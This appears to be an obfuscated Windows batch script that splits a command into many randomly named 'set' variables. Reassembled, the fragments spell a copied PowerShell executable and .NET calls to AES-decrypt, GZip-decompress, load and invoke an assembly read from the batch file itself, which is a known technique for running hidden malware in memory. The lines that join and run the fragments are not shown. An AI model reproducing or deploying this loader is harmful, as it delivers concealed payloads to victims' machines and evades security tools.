@echo off
set "tkGFqimJRs=em"
set "oGMAukHbUt=po"
set "PTltbgxXUz=.e"
set "UAJrteNkMT= C"
set "FdeyeXqZvK=ow"
set "QuFhjdgyli=:\"
set "jHESpxiwCS=nd"
set "VYyZKEtyRl=1."
set "FjzfwNOvlK=he"
set "xtVSuLJEqY=y "
set "LWBaaJkbpr=Wi"
set "sVhENhzGdL=py"
set "WrDyYhwFVW=ll"
set "NTEnZbIIvs=we"
set "FVYsfpmYEz=he"
set "mmwKIbxFLn=0\"
set "eVNnrIfpeA=in"
set "WgUznwDdtJ=do"
set "zjoaUPdWQZ=ws"
set "zoZTvUDLQy= /"
set "KLDdWFFaaS=ll"
set "VJWsDHSdVc=st"
set "lQmKNrhxMz=xe"
set "TMUvJiPMRL=Sy"
set "hvBxldAJFt=\v"
set "nfPRPLmEts=we"
set "XRNWWsoQsU=co"
set "iDhJPrecrs=\W"
set "aavVaXYJqK=s\"
set "ejrzoCLSAp=Po"
set "mhjPGUYQOj=rs"
set "NaIHTUGNtB=rS"
set "yzgSYTiIOV=32"
set "RfOnpaLHrS=cd"
set "KXWCrvavkp= %~dp0"
set "VqcZQHQTJh=ct S"
set "CHXjkbgBqZ=vert"
set "USTvoAPcMt=New-"
set "vUerCQDaWi=)($L"
set "WxLfYCuCXX=zHhH"
set "sdzUTpJjTO=($ud"
set "ySuODFnxuQ=iB.T"
set "sCfpCUtLeW=.Cry"
set "kKMONHdddp=]::("
set "OhduyKBkdV=ode]"
set "tSSMxtezcx=, $b"
set "JXREzYTvzl=('Tg"
set "eedJsshFJW=iB ="
set "mdoZqdhkYt= = N"
set "XKUwRLwtrv=::('"
set "HjAqwXIxnu=stem"
set "rpvcTRckCn=lC.T"
set "UPbdtoPeXn=)($b"
set "BehlSjGFJD=tem."
set "cCQjffgskb=-nop"
set "EVbTtXqCEp=pose"
set "nVygeEGBJd='0Pg"
set "toiCVBDMOO=-1.."
set "OpQqhjRHdL=m.IO"
set "RsjkfKsVZb=e]::"
set "SScIZlvFyg=ose("
set "QLhIxVldhS=-joi"
set "TyaKWLWwdw= if "
set "GsWZmErCKM=ecir"
set "QhgokEMVIu=6esa"
set "vjRfzvmfAu=Fina"
set "tVYnNlBsrq=d;$H"
set "bRfpRKXAIc=JX.I"
set "GcnDNHvaib=7;$H"
set "ymSbCcZssW=3); "
set "oJRxaDFnbb=ecry"
set "VlvLQXWXRW=iron"
set "BwqDDWqaEK=l5E7"
set "vaJXnDGPAS=stem"
set "oMobxtixTq=, (,"
set "rCPvkbQznp=ionM"
set "cbVGjqCKOX=bjec"
set "aUGmltBYTi=embl"
set "iFYQagOZWr=ment"
set "VoOQvlHley=TllA"
set "vfLRngqLjJ=flec"
set "ZewNVYLacf=uEJX"
set "HATdrHgzfZ=UPFL"
set "LhaqIpVyPh=oL'["
set "aNejDrSKaX=zuZI"
set "OScwBkEteX=rity"
set "vYUAyNHwWS=comm"
set "tlZzvuOOOX=);$H"
set "OTRHXmbTkv=$VUv"
set "TpFzGoynFb=Secu"
set "YbeMgZYWBI=s = "
set "CJBVNElIrP=  $L"
set "uePfecXTOm=rity"
set "XkaxUDDXEn=uEJX"
set "kPENwUzgmD=mory"
set "gNVFSjSLQP=tsWi"
set "pqKQqFLfkQ=PxEW"
set "INoMdZaRCo=Comp"
set "vAmDVIcLJH=raph"
set "TjUJrxfHnL=rans"
set "JLjfnpUyMo=ress"
set "IQcpaExRCk=::De"
set "kiqPcauMJx=oint"
set "UZvImRZXjO=:('g"
set "SwOLNmTwqg=eMVs"
set "OAtLhnTMLY=pose"
set "EpUopksExe===')"
set "vOMImIwprB=th('"
set "NFUroJJvpy=ateD"
set "glfjXVkyXn=]::("
set "puVrYWSXTF=] -j"
set "hAoIyKftEn=;$vt"
set "kisxKHBTUA=('%*'"
set "JvBRstVGMv= '')"
set "gQTIQINPen=gjYA"
set "WzcPQYXAeW=Conv"
set "gJMEhIbrcX='txe"
set "dPUxPJmkbI=.Dis"
set "XdkWSiuMKG=tryP"
set "gKjkYzxkBQ=y.Cr"
set "XIxdZXdDJr=16] "
set "qmoUMDQOSf=('%~f0'"
set "xraphuNVTi=]::N"
set "YwMusTaLRO==');"
set "dRrfaGNaks=$swx"
set "VOglEvAERE=L = "
set "FrVntcIsds=$vto"
set "MnBiRKrOjW=bUPF"
set "dHGOsfVNWz=ptog"
set "bKFBSwpwSk=)) {"
set "WbescbZwHc=ck($"
set "GlyVztTtgU=yste"
set "MzCVoQMsND=Obje"
set "xBtUGKDMtv=rg, "
